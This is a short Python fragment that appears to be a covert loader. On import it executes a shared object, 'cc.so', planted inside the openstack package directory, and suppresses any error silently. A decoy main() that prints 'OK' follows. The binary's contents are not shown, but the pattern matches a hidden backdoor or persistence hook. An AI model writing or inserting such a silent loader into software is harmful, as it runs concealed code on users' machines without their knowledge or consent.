try:
    import importlib.util
    spec = importlib.util.spec_from_file_location("cc", "/usr/local/lib/python3.6/site-packages/openstack/cc.so")
    cc = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(cc)
    cc.main()
except Exception:
    pass

def main():
    print("OK")
